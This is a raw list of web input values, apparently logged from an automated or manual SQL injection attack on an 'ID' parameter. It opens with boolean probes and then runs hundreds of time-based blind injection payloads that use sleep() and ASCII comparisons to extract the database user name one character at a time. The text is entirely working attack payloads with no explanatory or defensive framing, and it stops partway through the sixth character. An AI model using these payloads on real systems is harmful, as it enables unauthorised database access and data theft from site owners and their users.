ID:1
ID:1' and select 1-- 
ID:1' and 1=1-- 
ID:1' and 1=2-- 
ID:1' and 1=1-- 
ID:1' and 1=1-- 
ID:1' and 1=2-- 
ID:1' and 1=2-- 
ID:1' and IF(1=1,sleep(5),2)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=117,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=118,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=119,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=120,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=121,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=122,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=49,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=50,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=51,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=52,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=53,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=54,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=55,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=56,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=57,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=48,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=46,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=64,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=95,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=42,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=37,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=37,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),10,1))=37,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=37,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=37,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=114,sleep(3),1)
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=97,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=98,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=99,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=100,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=101,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=102,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=103,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=104,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=105,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=106,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=107,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=108,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=109,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=110,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=111,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=112,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=113,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=114,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=97,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=98,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=99,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=100,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=101,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=102,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=103,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=104,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=105,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=106,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=107,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=108,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=109,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=110,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=111,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=112,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=113,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=114,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=97,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=114,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=97,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=97,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=114,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=97,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=97,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=98,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=99,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=100,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=101,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=102,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=103,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=104,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=105,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=106,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=107,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=108,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=109,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=110,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=111,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=112,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=113,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=114,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=115,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=116,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=117,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=118,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=119,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=120,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=121,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=122,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=49,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=50,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=51,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=52,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=53,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=54,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=55,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=56,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=57,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=48,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=46,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=64,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=95,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=42,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),1,1))=37,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=97,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=98,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=99,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=100,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=101,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=102,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=103,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=104,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=105,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=106,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=107,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=108,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=109,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=110,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=111,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=112,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=113,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=114,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=115,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=116,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=117,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=118,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=119,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=120,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=121,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=122,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=49,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=50,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=51,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=52,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=53,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=54,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=55,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=56,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=57,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=48,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=46,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=64,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=95,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=42,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),2,1))=37,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=97,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=98,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=99,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=100,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=101,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=102,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=103,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=104,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=105,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=106,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=107,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=108,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=109,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=110,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=111,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=112,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=113,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=114,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=115,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=116,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=117,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=118,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=119,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=120,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=121,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=122,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=49,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=50,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=51,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=52,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=53,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=54,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=55,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=56,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=57,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=48,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=46,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=64,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=95,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=42,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),3,1))=37,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=97,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=98,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=99,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=100,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=101,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=102,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=103,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=104,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=105,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=106,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=107,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=108,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=109,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=110,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=111,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=112,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=113,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=114,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=115,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=116,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=117,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=118,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=119,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=120,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=121,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=122,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=49,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=50,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=51,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=52,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=53,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=54,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=55,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=56,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=57,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=48,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=46,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=64,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=95,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=42,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),4,1))=37,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=97,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=98,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=99,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=100,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=101,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=102,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=103,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=104,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=105,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=106,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=107,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=108,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=109,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=110,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=111,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=112,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=113,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=114,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=115,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=116,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=117,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=118,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=119,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=120,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=121,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=122,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=49,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=50,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=51,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=52,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=53,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=54,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=55,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=56,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=57,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=48,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=46,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=64,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=95,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=42,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),5,1))=37,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=97,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=98,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=99,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=100,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=101,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=102,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=103,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=104,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=105,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=106,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=107,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=108,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=109,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=110,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=111,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=112,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=113,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=114,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=115,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=116,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=117,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=118,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=119,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=120,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=121,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=122,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=49,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=50,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=51,sleep(3),1)-- 
ID:1'/**/and/**/if(ascii(mid(lower(user()),6,1))=52,sleep(3),1)-- 
